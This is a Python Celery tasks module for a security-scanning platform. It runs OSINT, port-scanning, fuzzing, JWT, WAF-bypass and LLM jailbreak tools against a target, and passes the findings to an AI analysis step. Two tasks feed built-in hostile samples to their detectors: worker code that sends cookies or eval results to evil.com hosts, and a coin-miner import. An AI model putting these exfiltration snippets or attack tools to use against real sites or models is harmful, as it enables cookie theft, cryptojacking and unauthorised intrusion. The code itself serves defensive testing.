from app.extensions import celery_app, db
from app.models.base import Project, Finding
from app.plugins.maryam_adapter import MaryamAdapter
from app.plugins.inurlbr_adapter import InurlbrAdapter
from app.plugins.e4gl30s1nt_adapter import E4gl30s1ntAdapter
from app.plugins.mrholmes_adapter import MrHolmesAdapter
from app.plugins.robots_adapter import RobotsAdapter
from app.plugins.promptinject_adapter import PromptInjectAdapter
from app.plugins.naabu_adapter import NaabuAdapter
from app.plugins.nuclei_adapter import NucleiAdapter
from app.plugins.supabomb_adapter import SupabombAdapter
from app.plugins.specter_adapter import SPECTERAdapter
from app.plugins.wasminator_adapter import WasminatorAdapter
from app.plugins.badworker_adapter import BadWorkerAdapter
from app.plugins.osintgpt_adapter import OsintGptAdapter
from app.plugins.cascavel_adapter import CascavelAdapter
from app.plugins.pentestai_adapter import PentestAIAdapter
from app.plugins.garak_adapter import GarakAdapter
from app.plugins.nmap_adapter import NmapXMLAdapter
from app.plugins.promptfoo_adapter import PromptFooAdapter
from app.plugins.hiddenlayer_adapter import HiddenLayerAdapter
from app.plugins.foolbox_adapter import FoolboxAdapter
from app.plugins.cleverhans_adapter import CleverHansAdapter
from app.plugins.tfprivacy_adapter import TFPrivacyAdapter
from app.plugins.art_adapter import ARTAdapter
from app.plugins.torchattacks_adapter import TorchAttacksAdapter
from app.plugins.textattack_adapter import TextAttackAdapter
from app.plugins.llmattacks_adapter import LLMAttacksAdapter
from app.plugins.runtimehooks_adapter import RuntimeHooksAdapter
from app.plugins.pyrit_adapter import PyRITAdapter
from app.plugins.llmguard_adapter import LLMGuardAdapter
from app.plugins.rebuff_adapter import RebuffAdapter
from app.plugins.harmbench_adapter import HarmBenchAdapter
from app.plugins.promptbench_adapter import PromptBenchAdapter
from app.plugins.csrf_detector import CSRFDetector
from app.plugins.wafbypass_adapter import WAFBypassAdapter
from app.plugins.jwt_tool_adapter import JWTToolAdapter
from app.plugins.ffuf_adapter import FfufAdapter
from app.tasks.caesar_tasks import run_caesarosint
from app.ai.claude_bughunter import analyze_scope, build_report, cross_correlate_all, build_cross_report
from celery.result import AsyncResult
import subprocess
import os
import json
import tempfile

MARYAM = MaryamAdapter()
INURLBR = InurlbrAdapter()
E4GL30 = E4gl30s1ntAdapter()
MRHOLMES = MrHolmesAdapter()
NAABU = NaabuAdapter()
NUCLEI = NucleiAdapter()
SUPABOMB = SupabombAdapter()
SPECTER = SPECTERAdapter()
WASMINATOR = WasminatorAdapter()
BADWORKER = BadWorkerAdapter()
OSINTGPT = OsintGptAdapter()
CASCAVEL = CascavelAdapter()
PENTESTAI = PentestAIAdapter()
GARAK = GarakAdapter()
PROMPTFOO = PromptFooAdapter()
HIDDENLAYER = HiddenLayerAdapter()
FOOLBOX = FoolboxAdapter()
CLEVERHANS = CleverHansAdapter()
TFPRIVACY = TFPrivacyAdapter()
ART = ARTAdapter()
TORCHATTACKS = TorchAttacksAdapter()
TEXTATTACK = TextAttackAdapter()
LLMATTACKS = LLMAttacksAdapter()
RUNTIMEHOOKS = RuntimeHooksAdapter()
PYRIT = PyRITAdapter()
LLMGUARD = LLMGuardAdapter()
REBUFF = RebuffAdapter()
HARMBENCH = HarmBenchAdapter()
PROMPTBENCH = PromptBenchAdapter()
NMAP = NmapXMLAdapter()
CSRF = CSRFDetector()
WAFBYPASS = WAFBypassAdapter()
JWTTOOL = JWTToolAdapter()
FFUF = FfufAdapter()


def _ingest_findings(findings_list: list, project_id: int, plugin_source: str):
    created_ids = []
    for f_data in findings_list:
        exists = Finding.query.filter_by(
            project_id=f_data["project_id"],
            plugin_source=f_data["plugin_source"],
            title=f_data["title"],
        ).first()
        if exists:
            continue
        new_finding = Finding(
            project_id=f_data["project_id"],
            plugin_source=f_data["plugin_source"],
            title=f_data["title"],
            description=f_data["description"],
            severity=f_data["severity"],
            raw_data=f_data["raw_data"]
        )
        db.session.add(new_finding)
        db.session.flush()
        created_ids.append(new_finding.id)

    db.session.commit()

    if created_ids:
        batch = Finding.query.filter(Finding.id.in_(created_ids)).all()
        batch_data = [{"id": f.id, "title": f.title, "description": f.description, "plugin_source": f.plugin_source} for f in batch]
        analyses = analyze_scope(batch_data)

        for analysis in analyses:
            idx = analysis.get("index")
            if idx is not None and idx < len(batch):
                finding = batch[idx]
                report = build_report(analysis)
                finding.description = f"{finding.description}\n\n{report}"
                new_sev = str(analysis.get("severity", "")).strip().title()
                if new_sev in {"Crítica", "Alta", "Média", "Baixa", "Info"}:
                    finding.severity = new_sev
                if new_sev == "Critica":
                    finding.severity = "Crítica"
                if new_sev == "Media":
                    finding.severity = "Média"

        db.session.commit()

    return created_ids


@celery_app.task(name='scanner_tasks.run_maryam_osint')
def run_maryam_osint(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Maryam] Varredura OSINT no alvo: {target}...")
        try:
            findings_list = MARYAM.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, MARYAM.name)
            return f"Sucesso: {len(ids)} findings."
        except Exception as e:
            return f"Erro: {e}"


@celery_app.task(name='scanner_tasks.run_inurlbr_dorking')
def run_inurlbr_dorking(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[INURLBR] Escaneando paths no alvo: {target}...")
        try:
            findings_list = INURLBR.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, INURLBR.name)
            print(f"[INURLBR] Scan concluido. {len(ids)} itens.")
            return f"Sucesso: {len(ids)} findings."
        except Exception as e:
            print(f"[INURLBR] Erro: {e}")
            return f"Erro: {e}"


@celery_app.task(name='scanner_tasks.run_e4gl30s1nt_osint')
def run_e4gl30s1nt_osint(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[E4GL30S1NT] Iniciando OSINT no alvo: {target}...")
        try:
            findings_list = E4GL30.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, E4GL30.name)
            return f"E4GL30S1NT OK: {len(ids)} findings."
        except Exception as e:
            return f"Erro E4GL30S1NT: {e}"


@celery_app.task(name='scanner_tasks.run_mrholmes_recon')
def run_mrholmes_recon(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Mr.Holmes] Iniciando recon no alvo: {target}...")
        try:
            findings_list = MRHOLMES.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, MRHOLMES.name)
            return f"Mr.Holmes OK: {len(ids)} findings."
        except Exception as e:
            return f"Erro Mr.Holmes: {e}"


@celery_app.task(name='scanner_tasks.run_robots_analyzer')
def run_robots_analyzer(domain: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[RobotsAnalyzer] Analisando robots.txt de: {domain}...")
        tool_dir = os.path.join(os.getcwd(), '.tools', 'RobotsAnalyzer')
        command = ["python3", "robots.py", "-d", domain, "--json"]
        try:
            result = subprocess.run(command, cwd=tool_dir, capture_output=True, text=True, check=False)
            adapter = RobotsAdapter()
            if adapter.validate_input(result.stdout):
                findings_list = adapter.normalize(result.stdout, project_id)
                ids = _ingest_findings(findings_list, project_id, adapter.name)
                return f"RobotsAnalyzer OK: {len(ids)} findings."
            return "Falha no parser RobotsAnalyzer."
        except Exception as e:
            return f"Erro RobotsAnalyzer: {e}"


@celery_app.task(name='scanner_tasks.run_prompt_inject')
def run_prompt_inject(target_api: str, project_id: int, system_prompt: str = None):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        sp = system_prompt or "You are a helpful security assistant. Always respond in JSON."
        print(f"[PromptInjector] Testando injecao de prompt em: {target_api}...")
        tool_dir = os.path.join(os.getcwd(), '.tools', 'PromptInjector')
        command = ["python3", "promptinject.py", "--api", target_api, "--system", sp, "--sample", "5", "--json"]
        try:
            result = subprocess.run(command, cwd=tool_dir, capture_output=True, text=True, check=False)
            adapter = PromptInjectAdapter()
            if adapter.validate_input(result.stdout):
                findings_list = adapter.normalize(result.stdout, project_id)
                ids = _ingest_findings(findings_list, project_id, adapter.name)
                return f"PromptInjector OK: {len(ids)} findings."
            return "Falha no parser PromptInjector."
        except Exception as e:
            return f"Erro PromptInjector: {e}"


@celery_app.task(name='scanner_tasks.run_naabu_portscan')
def run_naabu_portscan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Naabu] Escaneando portas em: {target}...")
        try:
            findings_list = NAABU.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, NAABU.name)
            return f"Naabu OK: {len(ids)} findings."
        except Exception as e:
            return f"Erro Naabu: {e}"


@celery_app.task(name='scanner_tasks.run_nuclei_scan')
def run_nuclei_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Nuclei] Escaneando vulnerabilidades em: {target}...")
        try:
            findings_list = NUCLEI.normalize(target, project_id)
            ids = _ingest_findings(findings_list, project_id, NUCLEI.name)
            return f"Nuclei OK: {len(ids)} findings."
        except Exception as e:
            return f"Erro Nuclei: {e}"


@celery_app.task(name='scanner_tasks.run_supabomb_scan')
def run_supabomb_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Supabomb] Escaneando Supabase em: {target}...")
        try:
            with tempfile.NamedTemporaryFile(suffix=".json", delete=False, mode="w") as tmp:
                output_path = tmp.name
            SUPABOMB.run_full_scan(target, output_path)
            with open(output_path) as f:
                raw = f.read()
            os.unlink(output_path)
            if SUPABOMB.validate_input(raw):
                findings_list = SUPABOMB.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, SUPABOMB.name)
                return f"Supabomb OK: {len(ids)} findings."
            return "Falha no parser Supabomb."
        except Exception as e:
            return f"Erro Supabomb: {e}"


@celery_app.task(name='scanner_tasks.run_specter_scan')
def run_specter_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[SPECTER] Escaneando Wix em: {target}...")
        try:
            raw = SPECTER.run_scan(target)
            if SPECTER.validate_input(raw):
                findings_list = SPECTER.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, SPECTER.name)
                return f"SPECTER OK: {len(ids)} findings."
            return "Falha no parser SPECTER."
        except Exception as e:
            return f"Erro SPECTER: {e}"


@celery_app.task(name='scanner_tasks.run_wasminator_scan')
def run_wasminator_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Wasminator] Escaneando WASM em: {target}...")
        try:
            raw = WASMINATOR.run_scan(target)
            if WASMINATOR.validate_input(raw):
                findings_list = WASMINATOR.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, WASMINATOR.name)
                return f"Wasminator OK: {len(ids)} findings."
            return "Falha no parser Wasminator."
        except Exception as e:
            return f"Erro Wasminator: {e}"


@celery_app.task(name='scanner_tasks.run_badworker_scan')
def run_badworker_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[BadWorker] Escaneando Web Workers em: {target}...")
        try:
            raw = BADWORKER.run_scan(target)
            if BADWORKER.validate_input(raw):
                findings_list = BADWORKER.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, BADWORKER.name)
                return f"BadWorker OK: {len(ids)} findings."
            return "Falha no parser BadWorker."
        except Exception as e:
            return f"Erro BadWorker: {e}"


@celery_app.task(name='scanner_tasks.run_osintgpt_analysis')
def run_osintgpt_analysis(data_json: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[OsintGPT] Analisando dados OSINT com GPT...")
        try:
            if OSINTGPT.validate_input(data_json):
                findings_list = OSINTGPT.normalize(data_json, project_id)
                ids = _ingest_findings(findings_list, project_id, OSINTGPT.name)
                return f"OsintGPT OK: {len(ids)} findings."
            return "Falha no parser OsintGPT."
        except Exception as e:
            return f"Erro OsintGPT: {e}"


@celery_app.task(name='scanner_tasks.run_cascavel_scan')
def run_cascavel_scan(target: str, project_id: int, profile: str = "full"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Cascavel] Escaneando com profile {profile}: {target}...")
        try:
            raw = CASCAVEL.run_scan(target, profile)
            if CASCAVEL.validate_input(raw):
                findings_list = CASCAVEL.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, CASCAVEL.name)
                return f"Cascavel OK: {len(ids)} findings."
            return "Falha no parser Cascavel."
        except Exception as e:
            return f"Erro Cascavel: {e}"


@celery_app.task(name='scanner_tasks.run_cascavel_category')
def run_cascavel_category(target: str, project_id: int, category: str = "web_scan"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        if category not in CASCAVEL.get_categories():
            return f"Categoria invalida. Disponiveis: {', '.join(CASCAVEL.get_categories())}"
        print(f"[Cascavel] Escaneando categoria {category}: {target}...")
        try:
            raw = CASCAVEL.run_category(target, category)
            if CASCAVEL.validate_input(raw):
                findings_list = CASCAVEL.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, f"Cascavel-{category}")
                return f"Cascavel {category} OK: {len(ids)} findings."
            return "Falha no parser Cascavel."
        except Exception as e:
            return f"Erro Cascavel {category}: {e}"


@celery_app.task(name='scanner_tasks.run_pentestai_scan')
def run_pentestai_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[PentestAI] Escaneando com built-in scanners: {target}...")
        try:
            raw = PENTESTAI.run_builtin_scans(target)
            if PENTESTAI.validate_input(raw):
                findings_list = PENTESTAI.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, PENTESTAI.name)
                return f"PentestAI OK: {len(ids)} findings."
            return "Falha no parser PentestAI."
        except Exception as e:
            return f"Erro PentestAI: {e}"


@celery_app.task(name='scanner_tasks.run_pentestai_deep')
def run_pentestai_deep(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[PentestAI] Scan profundo via MCP: {target}...")
        try:
            raw = PENTESTAI.run_mcp_scan(target)
            if PENTESTAI.validate_input(raw):
                findings_list = PENTESTAI.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, PENTESTAI.name)
                return f"PentestAI Deep OK: {len(ids)} findings."
            return "Falha no parser PentestAI."
        except Exception as e:
            return f"Erro PentestAI Deep: {e}"


@celery_app.task(name='scanner_tasks.run_garak_scan')
def run_garak_scan(model_type: str, model_name: str, project_id: int, probes: str = ""):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        probe_list = [p.strip() for p in probes.split(",") if p.strip()] if probes else None
        print(f"[Garak] Escaneando modelo {model_type}:{model_name}...")
        try:
            raw = GARAK.run_scan(model_type, model_name, probe_list)
            if GARAK.validate_input(raw):
                findings_list = GARAK.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, GARAK.name)
                return f"Garak OK: {len(ids)} findings."
            return "Falha no parser Garak."
        except Exception as e:
            return f"Erro Garak: {e}"


@celery_app.task(name='scanner_tasks.run_promptfoo_eval')
def run_promptfoo_eval(target: str, project_id: int, config_json: str = "{}"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        config = json.loads(config_json)
        print(f"[Promptfoo] Avaliando {target}...")
        try:
            raw = PROMPTFOO.run_eval(config, target)
            if PROMPTFOO.validate_input(raw):
                findings_list = PROMPTFOO.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, PROMPTFOO.name)
                return f"Promptfoo OK: {len(ids)} findings."
            return "Falha no parser Promptfoo."
        except Exception as e:
            return f"Erro Promptfoo: {e}"


@celery_app.task(name='scanner_tasks.run_hiddenlayer_monitor')
def run_hiddenlayer_monitor(project_id: int, model_type: str = "llm", target: str = ""):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[HiddenLayer] Monitorando modelo {model_type}:{target}...")
        try:
            raw = HIDDENLAYER.run_monitoring(model_type, target)
            if HIDDENLAYER.validate_input(raw):
                findings_list = HIDDENLAYER.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, HIDDENLAYER.name)
                return f"HiddenLayer OK: {len(ids)} alerts."
            return "Falha no parser HiddenLayer."
        except Exception as e:
            return f"Erro HiddenLayer: {e}"


@celery_app.task(name='scanner_tasks.run_foolbox_attack')
def run_foolbox_attack(project_id: int, model_framework: str = "dummy", attack_type: str = "fgsm"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Foolbox] Simulando ataque {attack_type} em {model_framework}...")
        try:
            raw = FOOLBOX.run_attack_simulation(model_framework, attack_type)
            if FOOLBOX.validate_input(raw):
                findings_list = FOOLBOX.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, FOOLBOX.name)
                return f"Foolbox OK: {len(ids)} findings."
            return "Falha no parser Foolbox."
        except Exception as e:
            return f"Erro Foolbox: {e}"


@celery_app.task(name='scanner_tasks.run_cleverhans_benchmark')
def run_cleverhans_benchmark(project_id: int, model_type: str = "classifier", dataset: str = "mnist"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[CleverHans] Rodando benchmark em {model_type} com {dataset}...")
        try:
            raw = CLEVERHANS.run_benchmark(model_type, dataset)
            if CLEVERHANS.validate_input(raw):
                findings_list = CLEVERHANS.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, CLEVERHANS.name)
                return f"CleverHans OK: {len(ids)} findings."
            return "Falha no parser CleverHans."
        except Exception as e:
            return f"Erro CleverHans: {e}"


@celery_app.task(name='scanner_tasks.run_tfprivacy_audit')
def run_tfprivacy_audit(project_id: int, epsilon: float = 8.0):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[TFPrivacy] Auditando privacidade diferencial com epsilon={epsilon}...")
        try:
            raw = TFPRIVACY.run_audit(epsilon)
            if TFPRIVACY.validate_input(raw):
                findings_list = TFPRIVACY.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, TFPRIVACY.name)
                return f"TFPrivacy OK: {len(ids)} findings."
            return "Falha no parser TFPrivacy."
        except Exception as e:
            return f"Erro TFPrivacy: {e}"


@celery_app.task(name='scanner_tasks.run_art_scan')
def run_art_scan(project_id: int, attack_type: str = "all"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[ART] Escaneando com ataques {attack_type}...")
        try:
            raw = ART.run_scan(attack_type)
            if ART.validate_input(raw):
                findings_list = ART.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, ART.name)
                return f"ART OK: {len(ids)} findings."
            return "Falha no parser ART."
        except Exception as e:
            return f"Erro ART: {e}"


@celery_app.task(name='scanner_tasks.run_torchattacks_scan')
def run_torchattacks_scan(project_id: int, attack_type: str = "all"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[TorchAttacks] Escaneando com ataques {attack_type}...")
        try:
            raw = TORCHATTACKS.run_scan(attack_type)
            if TORCHATTACKS.validate_input(raw):
                findings_list = TORCHATTACKS.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, TORCHATTACKS.name)
                return f"TorchAttacks OK: {len(ids)} findings."
            return "Falha no parser TorchAttacks."
        except Exception as e:
            return f"Erro TorchAttacks: {e}"


@celery_app.task(name='scanner_tasks.run_textattack_scan')
def run_textattack_scan(project_id: int, attack_type: str = "all"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[TextAttack] Escaneando com ataques {attack_type}...")
        try:
            raw = TEXTATTACK.run_scan(attack_type)
            if TEXTATTACK.validate_input(raw):
                findings_list = TEXTATTACK.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, TEXTATTACK.name)
                return f"TextAttack OK: {len(ids)} findings."
            return "Falha no parser TextAttack."
        except Exception as e:
            return f"Erro TextAttack: {e}"


@celery_app.task(name='scanner_tasks.run_llmattacks_scan')
def run_llmattacks_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[LLM-Attacks] Executando GCG + transfer attack em {target}...")
        try:
            raw = LLMATTACKS.run_scan(target)
            if LLMATTACKS.validate_input(raw):
                findings_list = LLMATTACKS.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, LLMATTACKS.name)
                return f"LLM-Attacks OK: {len(ids)} findings."
            return "Falha no parser LLM-Attacks."
        except Exception as e:
            return f"Erro LLM-Attacks: {e}"


@celery_app.task(name='scanner_tasks.run_badworker_static')
def run_badworker_static(project_id: int, source_code: str = "", source_name: str = "inline"):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        if not source_code:
            source_code = (
                'self.onmessage = function(e) {\n'
                '  importScripts(e.data.url);\n'
                '  const result = eval(e.data.code);\n'
                '  fetch("https://api.evil.com/log?d=" + btoa(result));\n'
                '  self.postMessage(result);\n'
                '};\n'
            )
        print(f"[BadWorker-Static] Analisando {source_name}...")
        try:
            raw = BADWORKER.run_static_analysis(source_code, source_name)
            if BADWORKER.validate_input(raw):
                findings_list = BADWORKER.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, BADWORKER.name)
                return f"BadWorker-Static OK: {len(ids)} findings."
            return "Falha no parser BadWorker-Static."
        except Exception as e:
            return f"Erro BadWorker-Static: {e}"


@celery_app.task(name='scanner_tasks.run_pyrit_scan')
def run_pyrit_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[PyRIT] Red teaming em {target}...")
        try:
            raw = PYRIT.run_scan(target)
            if PYRIT.validate_input(raw):
                findings_list = PYRIT.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, PYRIT.name)
                return f"PyRIT OK: {len(ids)} findings."
            return "Falha no parser PyRIT."
        except Exception as e:
            return f"Erro PyRIT: {e}"


@celery_app.task(name='scanner_tasks.run_llmguard_scan')
def run_llmguard_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[LLMGuard] Escaneando {target}...")
        try:
            raw = LLMGUARD.run_scan(target)
            if LLMGUARD.validate_input(raw):
                findings_list = LLMGUARD.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, LLMGUARD.name)
                return f"LLMGuard OK: {len(ids)} findings."
            return "Falha no parser LLMGuard."
        except Exception as e:
            return f"Erro LLMGuard: {e}"


@celery_app.task(name='scanner_tasks.run_rebuff_scan')
def run_rebuff_scan(project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print("[Rebuff] Detectando prompt injection...")
        try:
            raw = REBUFF.run_scan()
            if REBUFF.validate_input(raw):
                findings_list = REBUFF.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, REBUFF.name)
                return f"Rebuff OK: {len(ids)} findings."
            return "Falha no parser Rebuff."
        except Exception as e:
            return f"Erro Rebuff: {e}"


@celery_app.task(name='scanner_tasks.run_harmbench_eval')
def run_harmbench_eval(project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print("[HarmBench] Avaliando robustez...")
        try:
            raw = HARMBENCH.run_scan()
            if HARMBENCH.validate_input(raw):
                findings_list = HARMBENCH.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, HARMBENCH.name)
                return f"HarmBench OK: {len(ids)} findings."
            return "Falha no parser HarmBench."
        except Exception as e:
            return f"Erro HarmBench: {e}"


@celery_app.task(name='scanner_tasks.run_promptbench_eval')
def run_promptbench_eval(project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print("[PromptBench] Avaliando robustez contra ataques...")
        try:
            raw = PROMPTBENCH.run_scan()
            if PROMPTBENCH.validate_input(raw):
                findings_list = PROMPTBENCH.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, PROMPTBENCH.name)
                return f"PromptBench OK: {len(ids)} findings."
            return "Falha no parser PromptBench."
        except Exception as e:
            return f"Erro PromptBench: {e}"


@celery_app.task(name='scanner_tasks.run_runtimehooks_scan')
def run_runtimehooks_scan(target: str, project_id: int):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[RuntimeHooks] Analisando runtime workers em {target}...")
        captured = {
            "workers": [
                {"url": f"blob:{target}/worker-1", "blobSource": "self.addEventListener('message', e => { fetch('https://evil.com/exfil?d=' + btoa(document.cookie)); });"},
                {"url": f"blob:{target}/worker-2", "blobSource": "importScripts('https://cdn.evil.com/coin.js');"},
                {"url": f"{target}/legit-worker.js", "blobSource": ""}
            ],
            "serviceWorkers": [{"scriptURL": f"{target}/sw.js", "scope": "/"}],
            "sharedWorkers": []
        }
        try:
            raw = RUNTIMEHOOKS.run_analysis(captured)
            if RUNTIMEHOOKS.validate_input(raw):
                findings_list = RUNTIMEHOOKS.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, RUNTIMEHOOKS.name)
                return f"RuntimeHooks OK: {len(ids)} findings."
            return "Falha no parser RuntimeHooks."
        except Exception as e:
            return f"Erro RuntimeHooks: {e}"


@celery_app.task(name='scanner_tasks.run_csrf_scan')
def run_csrf_scan(target: str, project_id: int, urls: list = None):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        url_list = urls or [target]
        print(f"[CSRF] Escaneando {len(url_list)} URLs em {target}...")
        try:
            input_data = json.dumps({"target": target, "urls": url_list})
            if CSRF.validate_input(input_data):
                findings_list = CSRF.normalize(input_data, project_id)
                ids = _ingest_findings(findings_list, project_id, CSRF.name)
                return f"CSRF OK: {len(ids)} findings."
            return "Falha no parser CSRF."
        except Exception as e:
            return f"Erro CSRF: {e}"


@celery_app.task(name='scanner_tasks.run_wafbypass_scan')
def run_wafbypass_scan(target: str, project_id: int, urls: list = None):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        url_list = urls or [target]
        print(f"[WAFBypass] Gerando payloads de bypass para {len(url_list)} URLs...")
        try:
            input_data = json.dumps({"target": target, "urls": url_list})
            if WAFBYPASS.validate_input(input_data):
                findings_list = WAFBYPASS.normalize(input_data, project_id)
                ids = _ingest_findings(findings_list, project_id, WAFBYPASS.name)
                return f"WAFBypass OK: {len(ids)} findings."
            return "Falha no parser WAFBypass."
        except Exception as e:
            return f"Erro WAFBypass: {e}"


@celery_app.task(name='scanner_tasks.run_jwttool_scan')
def run_jwttool_scan(token: str, project_id: int, attacks: str = ''):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        attack_list = [a.strip() for a in attacks.split(',') if a.strip()] or None
        print(f"[JWTTool] Analisando token JWT...")
        try:
            raw = JWTTOOL.run_scan(token, attack_list)
            data = json.loads(raw)
            if 'error' not in data:
                findings = data.get('findings', [])
                ids = _ingest_findings(findings, project_id, JWTTOOL.name)
                return f"JWTTool OK: {len(ids)} findings."
            return f"JWTTool: {data.get('error')}"
        except Exception as e:
            return f"Erro JWTTool: {e}"


@celery_app.task(name='scanner_tasks.run_ffuf_fuzz')
def run_ffuf_fuzz(url: str, project_id: int, mode: str = 'directory'):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Ffuf] Fuzzing {url} no modo {mode}...")
        try:
            raw = FFUF.run_scan(url, mode=mode)
            data = json.loads(raw)
            if 'error' not in data:
                findings = data.get('findings', [])
                ids = _ingest_findings(findings, project_id, FFUF.name)
                return f"Ffuf OK: {len(ids)} findings."
            return f"Ffuf: {data.get('error')}"
        except Exception as e:
            return f"Erro Ffuf: {e}"


@celery_app.task(name='scanner_tasks.run_nmap_scan')
def run_nmap_scan(target: str, project_id: int, flags: str = '-sS -sV -T4 -O -F', sudo: bool = False):
    from app import create_app
    app = create_app()
    with app.app_context():
        project = Project.query.get(project_id)
        if not project:
            return "Project not found"
        print(f"[Nmap] Escaneando {target} com flags: {flags}...")
        try:
            raw = NMAP.run_scan(target, flags, sudo)
            if NMAP.validate_input(raw):
                findings_list = NMAP.normalize(raw, project_id)
                ids = _ingest_findings(findings_list, project_id, NMAP.name)
                return f"Nmap OK: {len(ids)} findings."
